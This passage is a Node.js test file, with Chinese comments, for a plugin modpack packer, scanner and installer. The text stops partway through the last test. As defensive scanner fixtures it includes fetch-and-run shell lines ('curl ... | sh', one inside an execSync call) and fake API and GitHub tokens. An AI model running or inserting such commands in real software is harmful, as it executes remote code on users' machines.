/**
 * dsh-modpack 自测：只依赖 node 内置模块，不碰真实 profile。
 * 运行：node test/run.mjs
 */
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { writeZip, readZip } from '../lib/zip.mjs'
import { satisfies, compareVersions } from '../lib/semver.mjs'
import { scanEntries, scanFile, groupFindings } from '../lib/scan.mjs'
import { parseYaml, emitYaml, upsertPatchItem } from '../lib/yamlish.mjs'
import { normalizeManifest } from '../lib/manifest.mjs'
import { checkCompatibility } from '../lib/compat.mjs'
import { buildPack, PackRefused, captureConfigs } from '../lib/pack.mjs'
import { inspectPackBuffer, installPack } from '../lib/install.mjs'
import { DEFAULT_CONFIG, clampConfig, appendHistory, readHistory, clearHistory, removeHistory } from '../lib/store.mjs'
import { listInstalled } from '../lib/profile.mjs'
import { assertAllowedUrl, parseCurlResponse, NET_DEFAULTS } from '../lib/net.mjs'
import { readMarketGroups, groupViews, applyMarketGroups } from '../lib/groups.mjs'
import { marketSummary, searchMarket, findMarketPack } from '../lib/modpack-catalog.mjs'

const results = []
let failed = 0

function test(name, fn) {
  try {
    const value = fn()
    if (value && typeof value.then === 'function') throw new Error('异步测试请用 testAsync')
    results.push(['ok', name, ''])
  } catch (error) {
    failed++
    results.push(['FAIL', name, String((error && error.stack) || error)])
  }
}

async function testAsync(name, fn) {
  try {
    await fn()
    results.push(['ok', name, ''])
  } catch (error) {
    failed++
    results.push(['FAIL', name, String((error && error.stack) || error)])
  }
}

function assert(cond, message) {
  if (!cond) throw new Error(message || '断言失败')
}

function assertEqual(actual, expected, message) {
  const a = JSON.stringify(actual)
  const b = JSON.stringify(expected)
  if (a !== b) throw new Error((message || '不相等') + '\n  实际：' + a + '\n  期望：' + b)
}

function tmpDir(tag) {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-modpack-test-' + tag + '-'))
}

// —— zip ——
test('zip 往返', () => {
  const entries = [
    { name: 'a.txt', data: Buffer.from('hello') },
    { name: 'dir/b.json', data: Buffer.from(JSON.stringify({ x: 1 })) },
  ]
  const buf = writeZip(entries)
  const back = readZip(buf)
  assertEqual(back.map((e) => e.name).sort(), ['a.txt', 'dir/b.json'])
  assertEqual(back.find((e) => e.name === 'a.txt').data.toString(), 'hello')
})

test('zip 拒绝路径逃逸', () => {
  let threw = false
  try { readZip(Buffer.from('PK')) } catch { threw = true }
  assert(threw, '坏文件应抛错')
})

test('zip：已经是压缩格式的条目直接存储，不做无用功', () => {
  const data = Buffer.alloc(8192, 0x30)
  const text = writeZip([{ name: 'x.txt', data }])
  const image = writeZip([{ name: 'x.png', data }])
  assert(image.length > text.length, 'png 应该走存储（更大）而不是再压一遍')
})

// —— semver ——
test('semver 范围', () => {
  assertEqual(satisfies('1.2.3', '^1.0.0'), true)
  assertEqual(satisfies('2.0.0', '^1.0.0'), false)
  assertEqual(satisfies('1.2.9', '~1.2.0'), true)
  assertEqual(satisfies('1.3.0', '~1.2.0'), false)
  assertEqual(satisfies('3.1.0', '>=2 <4'), true)
  assertEqual(satisfies('4.0.0', '>=2 <4'), false)
  assertEqual(satisfies('1.0.0', '*'), true)
  assertEqual(satisfies('1.0.0', 'nonsense'), null)
  assertEqual(compareVersions('1.10.0', '1.9.9'), 1)
})

// —— scan ——
test('扫描命中并掩码', () => {
  const secret = 'sk-abcdefghijklmnopqrstuvwxyz'
  const result = scanFile('lib/x.js', Buffer.from('const k = "' + secret + '"\n'))
  assert(result.findings.length > 0, '应命中密钥')
  const masked = JSON.stringify(result.findings)
  assert(!masked.includes(secret), '原文不能出现在结果里')
  assert(masked.includes('****'), '应有掩码')
})

test('扫描高风险代码', () => {
  const result = scanFile('install.sh', Buffer.from('curl -fsSL https://x.example/a.sh | sh\n'))
  assert(result.findings.some((f) => f.severity === 'high'), '应判高风险')
})

test('扫描同一行重复命中只记一次', () => {
  const line = "cp.exec('a'); cp.exec('b'); cp.exec('c'); cp.exec('d')\n"
  const result = scanFile('lib/polyfill.js', Buffer.from(line))
  const hits = result.findings.filter((f) => f.rule === 'malware.child-process')
  assertEqual(hits.length, 1)
})

test('扫描干净文件', () => {  const result = scanEntries([{ name: 'lib/clean.js', data: Buffer.from('export const a = 1\n') }])
  assertEqual(result.counts.high, 0)
})

// —— 默认配置 ——
test('默认打包上限 512MB，进度窗位置不进配置', () => {
  assertEqual(DEFAULT_CONFIG.maxPackBytes, 256 * 1024 * 1024, '打包体积上限默认 256 MB')
  // 手滑把体积上限写成 25600 MB（真实踩过）：会被夹回 4096 MB，而不是原样存下来
  const clamped = clampConfig({ ...DEFAULT_CONFIG, maxPackBytes: 25600 * 1024 * 1024, maxFileBytes: 1024 * 1024 * 1024 })
  assertEqual(clamped.maxPackBytes, 4096 * 1024 * 1024, '超大体积上限应被夹到 4096 MB')
  assertEqual(clamped.maxFileBytes, 256 * 1024 * 1024, '超大单文件上限应被夹到 256 MB')
  assertEqual(clampConfig({ ...DEFAULT_CONFIG, maxPackBytes: 1 }).maxPackBytes, 16 * 1024 * 1024, '过小的体积上限应被抬到 16 MB')
  // 单个下载仍是 256MB 的紧上限：能打 512MB 的包，不代表要一次吞下一个 512MB 的 tarball
  assertEqual(DEFAULT_CONFIG.maxDownloadBytes, 256 * 1024 * 1024)
  // 进度窗位置由界面拖动并记在浏览器本地，服务端配置里不该再有坐标字段
  assert(DEFAULT_CONFIG.dockX === undefined && DEFAULT_CONFIG.dockY === undefined, '坐标设置应已移除')
  // 版本清单上限：默认 64 MB，可调到 4~512 MB
  assertEqual(DEFAULT_CONFIG.maxMetadataBytes, 64, '版本清单上限默认 64 MB')
  assertEqual(clampConfig({ ...DEFAULT_CONFIG, maxMetadataBytes: 10000 }).maxMetadataBytes, 512, '过大的清单上限应被夹到 512 MB')
  assertEqual(clampConfig({ ...DEFAULT_CONFIG, maxMetadataBytes: 1 }).maxMetadataBytes, 4, '过小的清单上限应被抬到 4 MB')
})

test('定位语：默认配置里带那句备注，页面标题与市场描述共用同一句', () => {
  const tagline = '谁说dsh不能整整合包呢？（你说这几个插件整一块不牛逼坏了）'
  assertEqual(DEFAULT_CONFIG.tagline, tagline, '默认配置的定位语')
  assertEqual(clampConfig({ ...DEFAULT_CONFIG, tagline: '' }).tagline, tagline, '清空后退回默认定位语')
  const client = fs.readFileSync(new URL('../client.js', import.meta.url), 'utf8')
  assert(client.includes('status.config.tagline'), '页面标题读 status.config.tagline')
  const yml = fs.readFileSync(new URL('../dev/marketplace-awesome-dsh-plugin.yml', import.meta.url), 'utf8')
  assert(yml.includes('你说这几个插件整一块不牛逼坏了'), '市场条目描述带着那句备注')
  const readme = fs.readFileSync(new URL('../README.md', import.meta.url), 'utf8')
  assert(readme.includes(tagline), 'README 开头保留完整定位语')
  assert(yml.includes('npmjs.com/package/dsh-modpack-kit'), '市场条目介绍里带 npm 链接')
  const pkg = JSON.parse(fs.readFileSync(new URL('../package.json', import.meta.url), 'utf8'))
  assert(/^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?$/u.test(pkg.version), '版本号要像样子：'+pkg.version)
})

test('更新日志不收录预发布版本（-1 这类不写进改动汇总）', () => {
  const readme = fs.readFileSync(new URL('../README.md', import.meta.url), 'utf8')
  const at = readme.indexOf('## 更新日志')
  assert(at >= 0, 'README 要有更新日志段')
  const section = readme.slice(at)
  const bad = section.match(/^-\s+\*\*\d+\.\d+\.\d+-\d+\*\*/mu)
  assert(!bad, '预发布版本不该出现在更新日志里：' + (bad && bad[0]))
})

// —— 版本清单：billion-context 那种十几 MB 的包 ——
test('版本清单：超大包能退让到精简清单 / 单版本清单，不再卡在 16 MB', () => {
  const registry = fs.readFileSync(new URL('../lib/registry.mjs', import.meta.url), 'utf8')
  const net = fs.readFileSync(new URL('../lib/net.mjs', import.meta.url), 'utf8')
  assert(registry.includes('application/vnd.npm.install-v1+json'), '应优先请求 npm 的精简清单')
  assert(registry.includes("label: '单版本清单'"), '应保留单版本清单这条退路')
  assert(registry.includes('export function metadataLimit'), '上限应可配置（maxMetadataBytes）')
  assert(registry.includes('maxMetadataBytes'), '错误提示里应告诉用户能调大上限')
  assert(net.includes("'--compressed'"), 'curl 兜底应走压缩传输')
  assert(net.includes("'accept-encoding'"), 'fetch 应声明 accept-encoding')
  assert(net.includes('accept: options.accept ??'), 'requestJson 不能覆盖调用方的 accept')
})

// —— 轻量包：内存里扫，不落临时目录 ——
test('轻量包安装：代码取回后先在内存里扫，再按 name@version 装', () => {
  const install = fs.readFileSync(new URL('../lib/install.mjs', import.meta.url), 'utf8')
  const index = fs.readFileSync(new URL('../index.js', import.meta.url), 'utf8')
  assert(install.includes('context.resolveSourceEntries'), '安装器应优先用内存里的条目')
  assert(install.includes('全程在内存里，没有落盘'), '提示里应说明没有落盘')
  assert(index.includes('resolveSourceEntries: async (plugin)'), '宿主侧应提供 resolveSourceEntries')
})

// —— yaml ——
test('patch yml 往返', () => {
  const text = '- id: a\n  name: pkg-a\n  config:\n    x: 1\n- id: b\n  name: pkg-b\n'
  const parsed = parseYaml(text)
  assertEqual(parsed.map((x) => x.id), ['a', 'b'])
  const emitted = emitYaml(parsed, 0)
  assertEqual(parseYaml(emitted), parsed)
})

test('patch yml upsert 保留其它条目', () => {
  const text = '- id: a\n  name: pkg-a\n  config:\n    x: 1\n\n- id: b\n  name: pkg-b\n  config:\n    y: 2\n'
  const replaced = upsertPatchItem(text, { id: 'a', name: 'pkg-a', config: { x: 9 } })
  assertEqual(replaced.action, 'replaced')
  const after = parseYaml(replaced.text)
  assertEqual(after.find((x) => x.id === 'a').config, { x: 9 })
  assertEqual(after.find((x) => x.id === 'b').config, { y: 2 })
  const inserted = upsertPatchItem(text, { id: 'c', name: 'pkg-c', config: { z: 3 } })
  assertEqual(inserted.action, 'inserted')
  assertEqual(parseYaml(inserted.text).map((x) => x.id), ['a', 'b', 'c'])
})

test('patch yml 空数组与空对象写在同一行（否则不是合法 YAML）', () => {
  const config = { emptyList: [], emptyMap: {}, nested: { list: [], map: {}, keep: 1 }, rows: [{ tags: [], meta: {} }] }
  const { text, action } = upsertPatchItem('- id: other\n  name: pkg-other\n', { id: 'a', name: 'pkg-a', config })
  assertEqual(action, 'inserted')
  assert(text.includes('emptyList: []'), '空数组应与键写在同一行')
  assert(text.includes('emptyMap: {}'), '空对象应与键写在同一行')
  assertEqual(parseYaml(text).find((x) => x.id === 'a').config, config)
})

test('patch yml flow 映射的带引号键也能读回原名', () => {
  const text = '- id: a\n  name: pkg-a\n  config: {"endpoint":"https://x.invalid","rules":[{"match":"^/a","weight":2}],"empty":[]}\n'
  const parsed = parseYaml(text)
  assertEqual(parsed[0].config, { endpoint: 'https://x.invalid', rules: [{ match: '^/a', weight: 2 }], empty: [] })
})

// —— manifest ——
test('清单规范校验', () => {
  let threw = false
  try { normalizeManifest({ schema: 1, kind: 'nope', plugins: [] }) } catch { threw = true }
  assert(threw, '错误的 kind 应被拒')
  const ok = normalizeManifest({
    schema: 1,
    kind: 'dsh-modpack',
    name: 'demo',
    format: 'full',
    plugins: [{ name: 'a', version: '1.0.0' }],
  })
  assertEqual(ok.plugins.length, 1)
  let dup = false
  try {
    normalizeManifest({ schema: 1, kind: 'dsh-modpack', name: 'demo', format: 'full', plugins: [{ name: 'a', version: '1.0.0' }, { name: 'a', version: '2.0.0' }] })
  } catch { dup = true }
  assert(dup, '清单里重复插件应被拒（来源可疑）')
  let newer = ''
  try {
    normalizeManifest({ schema: 2, kind: 'dsh-modpack', name: 'demo', format: 'full', plugins: [{ name: 'a', version: '1.0.0' }] })
  } catch (error) { newer = String(error.message) }
  assert(newer.includes('升级'), '更新的格式应提示先升级插件，实际：' + newer)
})

// —— compat ——
test('兼容性：缺 peer 与 engines', () => {
  const compat = checkCompatibility([
    { name: 'p', version: '1.0.0', peerDependencies: { 'other-pkg': '^2.0.0' }, engines: { dsh: '>=99' } },
  ], { installed: [], dshVersion: '1.0.0', nodeVersion: '20.0.0', config: { licenseAllow: ['MIT'] } })
  assert(compat.findings.some((f) => f.code && /peer/iu.test(f.code)), '应报 peer 问题')
  assert(compat.findings.some((f) => f.message.includes('other-pkg')), '消息里应有包名')
})

// —— 端到端：打包 → 读回 → 演练安装 ——
async function fixture() {
  const home = tmpDir('home')
  process.env.DSH_HOME = home
  const profileDir = path.join(home, 'profiles', 'desktop')
  fs.mkdirSync(profileDir, { recursive: true })
  fs.writeFileSync(path.join(profileDir, 'package.json'), JSON.stringify({
    name: 'desktop',
    private: true,
    dependencies: {},
    dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(profileDir, 'cordis.patch.yml'), '- id: demo\n  name: demo-plugin\n  config:\n    greeting: hi\n')

  const pluginDir = path.join(profileDir, 'node_modules', 'demo-plugin')
  fs.mkdirSync(path.join(pluginDir, 'lib'), { recursive: true })
  fs.writeFileSync(path.join(pluginDir, 'package.json'), JSON.stringify({
    name: 'demo-plugin',
    version: '1.2.3',
    license: 'MIT',
    dsh: { client: { platform: 'web' } },
    exports: { './client': './client.js' },
  }, null, 2))
  fs.writeFileSync(path.join(pluginDir, 'index.js'), 'export function apply() {}\n')
  fs.writeFileSync(path.join(pluginDir, 'lib', 'util.js'), 'export const a = 1\n')

  const installed = [{
    name: 'demo-plugin',
    dirName: 'demo-plugin',
    version: '1.2.3',
    dir: pluginDir,
    realDir: pluginDir,
    pkg: JSON.parse(fs.readFileSync(path.join(pluginDir, 'package.json'), 'utf8')),
    isBundle: true,
    hasClient: true,
    hasPatch: false,
    size: 100,
  }]

  return { home, profileDir, pluginDir, installed }
}

const packContext = (config, profileDir, installed) => ({
  config,
  profileDir,
  dshVersion: '1.0.0',
  installed,
  pluginVersion: '0.1.0',
  parsePatch: parseYaml,
  patchText: fs.readFileSync(path.join(profileDir, 'cordis.patch.yml'), 'utf8'),
})

const baseConfig = {
  includePayload: true,
  licenseAllow: ['MIT', 'Apache-2.0'],
  blockHighRisk: true,
  maxFileBytes: 4 * 1024 * 1024,
  maxPackBytes: 64 * 1024 * 1024,
  scanBeforePack: true,
  scanBeforeInstall: true,
  historyLimit: 20,
  profile: 'desktop',
}

await testAsync('端到端：完整版打包并读回', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '测试包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  assert(result.size > 0, '应产出非空文件')
  assertEqual(result.manifest.format, 'full')
  assertEqual(result.manifest.plugins.length, 1)
  assert(result.manifest.plugins[0].configIncluded, '应抓到配置')

  const names = readZip(result.buffer).map((entry) => entry.name)
  assert(names.includes('install/install.mjs'), '完整版应带无插件也能跑的安装器 install/install.mjs')
  assert(names.includes('install/install.cmd'), '完整版应带 Windows 双击入口')
  assert(names.includes('install/install.sh'), '完整版应带 shell 入口')

  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  assertEqual(inspected.integrity.ok, true)
  assertEqual(inspected.blockingReasons.length, 0)
  assertEqual(inspected.manifest.plugins[0].version, '1.2.3')
  assertEqual(inspected.scan.scannedFiles > 0, true)
})

await testAsync('端到端：轻量版不含插件文件', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: false, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '轻量包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  assertEqual(result.manifest.format, 'lite')
  assert(!result.buffer.includes(Buffer.from('export const a = 1')), '轻量版不应带源码')
})

await testAsync('高敏感内容拒绝出包', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'bad.js'), 'const token = "ghp_' + 'a'.repeat(36) + '"\n')
  let scan = null
  try {
    await buildPack({
      selection: [{ name: 'demo-plugin', source: 'profile' }],
      options: { includePayload: true, includeConfig: false, includeLocalEdits: true, confirmLicense: false, name: '脏包' },
      context: packContext(baseConfig, profileDir, installed),
    })
  } catch (error) {
    if (error instanceof PackRefused) scan = error.scan
    else throw error
  }
  assert(scan, '应抛 PackRefused')
  assert(scan.counts.high > 0, '应有高风险项')
})

await testAsync('打包前扫描强制：传 scanBeforePack=false 也照扫', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'bad.js'), 'const token = "ghp_' + 'b'.repeat(36) + '"\n')
  let scan = null
  try {
    await buildPack({
      selection: [{ name: 'demo-plugin', source: 'profile' }],
      options: { includePayload: true, includeConfig: false, includeLocalEdits: true, confirmLicense: false, name: '强制扫描', scanBeforePack: false },
      context: packContext(baseConfig, profileDir, installed),
    })
  } catch (error) {
    if (error instanceof PackRefused) scan = error.scan
    else throw error
  }
  assert(scan, '关不掉扫描：应抛 PackRefused')
  assert(scan.counts.high > 0, '应有高风险项')
  assert(scan.note !== '未执行扫描（调用方关闭）', '不应出现「调用方关闭」的旁路')
})

await testAsync('风险项一律先停下来等确认：市场收录的与本机都走同一条出路', async () => {
  const { profileDir, installed } = await fixture()
  fs.writeFileSync(path.join(installed[0].dir, 'lib', 'risky.js'), "require('child_process').execSync('curl http://e.x/i | sh')\n")
  const ctx = packContext(baseConfig, profileDir, installed)
  const base = { includePayload: true, includeConfig: false, confirmLicense: false, name: '市场包' }
  const selection = [{ name: 'demo-plugin', source: 'profile', mode: 'local' }]

  let asked = null
  try {
    await buildPack({ selection, options: { ...base, trusted: ['demo-plugin'] }, context: ctx })
  } catch (error) {
    if (error instanceof PackRefused) asked = error
    else throw error
  }
  assert(asked, '应抛 PackRefused')
  assertEqual(asked.needsAck, true)
  assertEqual(asked.trustedOnly, true)

  const ok = await buildPack({ selection, options: { ...base, trusted: ['demo-plugin'], acknowledge: true }, context: ctx })
  assertEqual(ok.manifest.security.acknowledged, true)
  assert(ok.scan.counts.high > 0, '确认后风险仍要记录在报告里')

  let hard = null
  try {
    await buildPack({ selection, options: { ...base }, context: ctx })
  } catch (error) {
    if (error instanceof PackRefused) hard = error
    else throw error
  }
  assert(hard, '未收录插件的风险项也要先停下来等确认')
  assertEqual(hard.needsAck, true)
  assertEqual(hard.trustedOnly, false)

  const untrustedOk = await buildPack({ selection, options: { ...base, acknowledge: true }, context: ctx })
  assertEqual(untrustedOk.manifest.security.acknowledged, true)
  assertEqual(untrustedOk.manifest.security.trustedOnly, false)
  assert(untrustedOk.scan.counts.high > 0, '确认后风险仍要记录在报告里')
})

await testAsync('端到端：演练安装（不落地）', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '演练包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  const install = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { dryRun: true, keepLocal: false, applyConfig: true },
    context: { profileDir },
  })
  assert(install.actions.length > 0, '应有动作记录')
  assert(install.actions.every((a) => a.ok), '演练应全部通过：' + JSON.stringify(install.actions))
})

await testAsync('逐插件模式：base 取上游原版且不打本机配置', async () => {
  const { profileDir, installed } = await fixture()
  const upstreamPkg = { name: 'demo-plugin', version: '1.2.3', license: 'MIT', dsh: { client: { platform: 'web' } } }
  const result = await buildPack({
    selection: [{
      name: 'demo-plugin',
      source: 'profile',
      mode: 'base',
      download: async () => ({
        pkg: upstreamPkg,
        registry: 'https://registry.npmjs.org',
        tarball: 'https://registry.npmjs.org/demo-plugin/-/demo-plugin-1.2.3.tgz',
        integrity: 'sha512-x',
        entries: [
          { name: 'package.json', data: Buffer.from(JSON.stringify(upstreamPkg)) },
          { name: 'index.js', data: Buffer.from('export function apply() { /* upstream */ }\n') },
        ],
      }),
    }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '基础配置包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const plugin = result.manifest.plugins[0]
  assertEqual(plugin.mode, 'base')
  assertEqual(plugin.localEdits, false)
  assertEqual(plugin.configIncluded, false, 'base 模式不应带本机配置')
  assert(result.buffer.includes(Buffer.from('/* upstream */')), '应带上游文件')
  assert(!result.buffer.includes(Buffer.from('export const a = 1')), 'base 模式不应带本机改动文件')
})

await testAsync('逐插件模式：local 带本机代码与配置快照', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: false, confirmLicense: false, name: '本地改动包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const plugin = result.manifest.plugins[0]
  assertEqual(plugin.mode, 'local')
  assertEqual(plugin.configIncluded, true, 'local 模式应带本机配置')
  assert(result.buffer.includes(Buffer.from('export const a = 1')), '应带本机文件')
})

await testAsync('逐插件配置：插件预设不打配置，自定义配置带配置（市场版与本机版都适用）', async () => {
  const { profileDir, installed } = await fixture()
  const options = { includePayload: true, includeConfig: true, includeLocalEdits: true, confirmLicense: false, name: '配置选择包' }

  // 本机版 + 插件预设：代码照打，但不带本机配置与数据快照
  const preset = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local', configMode: 'preset' }],
    options,
    context: packContext(baseConfig, profileDir, installed),
  })
  assertEqual(preset.manifest.plugins[0].configMode, 'preset')
  assertEqual(preset.manifest.plugins[0].configIncluded, false, '插件预设不应带本机配置')
  assertEqual(preset.manifest.plugins[0].dataIncluded, false, '插件预设不应带数据快照')
  assert(!preset.buffer.includes(Buffer.from('configs/demo-plugin.json')), '包内不该有配置快照')

  // 市场版 + 自定义配置：从 registry 取包，但带上本机这份插件的配置
  const upstreamPkg = { name: 'demo-plugin', version: '1.2.3', license: 'MIT', dsh: { client: { platform: 'web' } } }
  const download = async () => ({
    pkg: upstreamPkg,
    registry: 'https://registry.npmjs.org',
    tarball: 'https://registry.npmjs.org/demo-plugin/-/demo-plugin-1.2.3.tgz',
    integrity: 'sha512-x',
    entries: [
      { name: 'package.json', data: Buffer.from(JSON.stringify(upstreamPkg)) },
      { name: 'index.js', data: Buffer.from('export function apply() { /* upstream */ }\n') },
    ],
  })
  const custom = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'npm', spec: '1.2.3', configMode: 'custom', download }],
    options,
    context: packContext(baseConfig, profileDir, installed),
  })
  assertEqual(custom.manifest.plugins[0].source, 'npm')
  assertEqual(custom.manifest.plugins[0].configMode, 'custom')
  assertEqual(custom.manifest.plugins[0].configIncluded, true, '市场版选了自定义配置也要带本机配置')
  assert(custom.buffer.includes(Buffer.from('configs/demo-plugin.json')), '包内应有配置快照')

  // 市场版 + 插件预设：什么都不带
  const marketPreset = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'npm', spec: '1.2.3', configMode: 'preset', download }],
    options,
    context: packContext(baseConfig, profileDir, installed),
  })
  assertEqual(marketPreset.manifest.plugins[0].configIncluded, false, '市场版选插件预设不该带配置')
})

await testAsync('逐插件模式：manifest 统一带 mode 字段', async () => {
  const { profileDir, installed } = await fixture()
  const result = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile', mode: 'local' }],
    options: { includePayload: false, includeConfig: false, name: '字段包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(result.buffer, { config: baseConfig })
  assert(inspected.manifest.plugins.every((p) => p.mode === 'local' || p.mode === 'base'), 'mode 必须落到清单')
})

await testAsync('分类：按名字与描述打标签', async () => {
  const { classifyPlugin, categoryLabel } = await import('../lib/classify.mjs')
  assertEqual(classifyPlugin({ name: 'dsh-bili-tools', description: 'B站弹幕与字幕' }).id, 'media')
  assertEqual(classifyPlugin({ name: 'dsh-modpack-kit', description: '打包整合包' }).id, 'pack')
  assertEqual(classifyPlugin({ name: 'dsh-theme-neon', description: '界面主题' }).id, 'ui')
  assertEqual(classifyPlugin({ name: 'zzz', description: '' }).id, 'other')
  assertEqual(categoryLabel('pack'), '打包与分发')
  assertEqual(classifyPlugin({ title: 'MCP 开发调试器', description: 'debug 工具' }).id, 'dev')
})

await testAsync('安装：配置回填不能冲掉其它条目（回归 readPatch 返回字符串）', async () => {
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, name: '回填包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })
  assertEqual(inspected.integrity.ok, true)

  const targetHome = tmpDir('target-home')
  process.env.DSH_HOME = targetHome
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  const before = ['- id: keep-me', '  name: other-plugin', '  config:', '    x: 1', ''].join('\n')
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), before)

  const result = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: true, keepLocal: false, enableBundles: false },
    context: { profileDir: targetProfile, runCli: async () => ({ code: 0, output: 'fake cli' }) },
  })
  assertEqual(result.ok, true)
  const after = fs.readFileSync(path.join(targetProfile, 'cordis.patch.yml'), 'utf8')
  assert(after.includes('keep-me'), '别的配置条目不能被冲掉：' + after)
  assert(after.includes('greeting'), '目标插件的配置没写回去：' + after)
})

await testAsync('安装：数据快照写回 ~/.dsh/<目录>，已有的文件不覆盖', async () => {
  const { profileDir, installed } = await fixture()
  const srcHome = process.env.DSH_HOME
  const srcData = path.join(srcHome, 'demo-plugin')
  fs.mkdirSync(srcData, { recursive: true })
  fs.writeFileSync(path.join(srcData, 'notes.md'), '# 笔记\n中文行\n', 'utf8')
  fs.writeFileSync(path.join(srcData, 'state.json'), '{"seen":3}', 'utf8')

  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: true, includeLocalEdits: true, name: '数据包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })
  assert(inspected.manifest.plugins[0].dataIncluded === true, '清单里应标出带了数据快照')
  assert(inspected.manifest.plugins[0].dataDirs.includes('demo-plugin'), '应记录数据目录真名')

  const targetHome = tmpDir('data-home')
  process.env.DSH_HOME = targetHome
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  fs.writeFileSync(path.join(targetProfile, 'package.json'), JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: [] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '- id: keep\n  name: keep-me\n')
  // 本机已有同名数据文件：默认不动它
  fs.mkdirSync(path.join(targetHome, 'demo-plugin'), { recursive: true })
  fs.writeFileSync(path.join(targetHome, 'demo-plugin', 'state.json'), '{"seen":1}', 'utf8')

  const result = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, enableBundles: false },
    context: { profileDir: targetProfile, runCli: async () => ({ code: 0, output: 'fake cli' }) },
  })
  assertEqual(result.ok, true)
  const notes = path.join(targetHome, 'demo-plugin', 'notes.md')
  assert(fs.existsSync(notes), '数据快照里的新文件应写回')
  assert(fs.readFileSync(notes, 'utf8').includes('中文行'), '写回内容要原样')
  assertEqual(fs.readFileSync(path.join(targetHome, 'demo-plugin', 'state.json'), 'utf8'), '{"seen":1}')
  assert(result.lines.some((line) => line.includes('未覆盖')), '已有文件未覆盖时要说清楚：' + result.lines.join(' | '))
})

await testAsync('安装：不启用时 bundle 清单要被撤回原样', async () => {
  const { profileDir, installed } = await fixture()
  const built = await buildPack({
    selection: [{ name: 'demo-plugin', source: 'profile' }],
    options: { includePayload: true, includeConfig: false, name: '不启用包' },
    context: packContext(baseConfig, profileDir, installed),
  })
  const inspected = inspectPackBuffer(built.buffer, { config: baseConfig })

  const targetHome = tmpDir('bundle-home')
  process.env.DSH_HOME = targetHome
  const targetProfile = path.join(targetHome, 'profiles', 'desktop')
  fs.mkdirSync(targetProfile, { recursive: true })
  const profileJson = path.join(targetProfile, 'package.json')
  fs.writeFileSync(profileJson, JSON.stringify({
    name: 'desktop', private: true, dependencies: {}, dsh: { profile: { bundles: ['keep-me'] } },
  }, null, 2))
  fs.writeFileSync(path.join(targetProfile, 'cordis.patch.yml'), '- id: keep\n  name: keep-me\n')

  // 假的 dsh CLI：模拟 add 之后写入依赖并把自己登记进 bundles
  const fakeCli = async () => {
    const pkg = JSON.parse(fs.readFileSync(profileJson, 'utf8'))
    pkg.dependencies['demo-plugin'] = 'file:' + path.join(targetProfile, 'node_modules', 'demo-plugin')
    const bundles = new Set(pkg.dsh.profile.bundles)
    bundles.add('demo-plugin')
    pkg.dsh.profile.bundles = [...bundles]
    fs.writeFileSync(profileJson, JSON.stringify(pkg, null, 2))
    return { code: 0, output: 'fake cli added' }
  }

  const result = await installPack({
    manifest: inspected.manifest,
    entries: inspected.entries,
    config: baseConfig,
    options: { force: true, applyConfig: false, keepLocal: false, enableBundles: false },
    context: { profileDir: targetProfile, runCli: fakeCli },
  })
  assertEqual(result.ok, true)
  const after = JSON.parse(fs.readFileSync(profileJson, 'utf8'))
  assert(after.dependencies['demo-plugin'], '依赖应该照常写入')
  assertEqual(after.dsh.profile.bundles.length, 1, 'bundles 里只应剩原来的 keep-me')
  assertEqual(after.dsh.profile.bundles[0], 'keep-me')
